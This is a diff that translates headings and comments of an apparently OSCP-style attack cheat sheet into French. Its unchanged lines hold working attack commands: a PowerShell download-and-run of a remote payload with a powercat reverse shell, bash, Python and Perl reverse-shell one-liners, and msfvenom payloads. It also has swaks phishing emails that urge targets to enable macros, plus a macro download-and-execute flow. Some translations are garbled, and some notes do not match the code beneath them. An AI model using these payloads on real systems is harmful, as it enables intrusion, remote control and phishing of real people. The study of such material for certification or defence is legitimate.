@@ -97,7 +97,7 @@ End Sub
 ```
 
 
-## Windows Library Files
+## Fichiers de bibliothèque Windows
 
 Observer les permissions et la configuration de Windows.
 
@@ -112,7 +112,7 @@ wsgidav --host=0.0.0.0 --port=[port] --auth=anonymous --root /path/to/webdav/
 <p class="oscp-command-note">Exécuter un script PowerShell.</p>
 
 ```powershell
-# Create the file as a shortcut in the Windows system to prepare the attack
+# Créez le fichier comme un raccourci dans le système Windows pour préparer l'attaque
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('[http://your-server/payload.ps1]');powercat -c [attacker-ip] -p [port] -e powershell"
 ```
 
@@ -189,7 +189,7 @@ End Sub
 <p class="oscp-command-note">Script PowerShell dans la rubrique « Avancé Exploitation ».</p>
 
 ```powershell
-# Using Encodings
+# Utilisation des encodages
 $text = "[Your PowerShell Command]"
 $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text))
 Write-Output $encoded
@@ -265,7 +265,7 @@ sudo swaks -t <recipient@example.com> --from <sender@example.com> \
 `--auth-user` · `--auth-password`  
 
 
-### Email with Custom Headers for Social Engineering
+### Email avec des en-têtes personnalisés pour le génie social
 
 
 <p class="oscp-command-note">Examiner la configuration SMTP.</p>
@@ -281,7 +281,7 @@ sudo swaks -t [target-email] --from [your-email] --attach [file-to-attach] \
 `X-Priority` · `Importance`  
 
 
-### Alternative Tool sendemail
+### Autre outil envoyer un courriel
 
 
 
@@ -305,7 +305,7 @@ sendemail -f '[sender]' -t '[recipient]' -s "[smtp_server]:[port]" \
 No · Yes · No · No
 
 
-**Custom Headers**
+**En-têtes personnalisés**
 
 Subject only · Subject only · Multiple (e.g., Priority, Importance) · Subject only
 
@@ -338,16 +338,16 @@ echo 'bash -i >& /dev/tcp/<your_ip>/4444 0>&1' > shell.sh
 # Alternatively, use msfvenom to create an ELF payload
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o shell.elf
 
-# If the target machine allows Bash scripts to execute
+# Si la machine cible permet aux scripts Bash d'exécuter
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f bash -o payload.sh
 
-# Useful if Python is available on the target
+# Utile si Python est disponible sur la cible
 msfvenom -p python/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=4444 -f raw -o payload.py
 
-# Alternative Python Reverse Shell Payload
+# Autre Python Inverser la charge utile de Shell
 echo 'import socket,subprocess,os;s=socket.socket();s.connect(("<your_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > shell.py
 
-# Alternative Perl Reverse Shell Payload
+# Charge utile alternative Perl Reverse Shell
 echo 'use Socket;$i="<your_ip>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' > shell.pl
 ```
 
@@ -416,8 +416,8 @@ swaks --to target@example.com --from emmanuel@example.com \
 --body "Hello,\n\nPlease find the attached document and enable macros to view the content.\n\nBest regards,\nEmmanuel"
 
 # Execution Flow:
-# 1. Target opens the LibreOffice document.
-# 2. When the target enables macros, the payload is downloaded and executed.
+# 1. La cible ouvre le document LibreOffice.
+# 2. Lorsque la cible permet des macros, la charge utile est téléchargée et exécutée.
 # 3. A reverse shell connects to your Netcat listener.
 ```
 
@@ -500,7 +500,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker-ip> LPORT=<port> -f hta-ps
 <p class="oscp-command-note">Script Python lié à « Cibles Windows ».</p>
 
 ```python
-# Python script to split the payload into 50-character chunks
+# script Python pour diviser la charge utile en morceaux de 50 caractères
 s = "<PASTE_PAYLOAD_HERE>"  # Replace with your payload string
 n = 50  # Chunk size
 
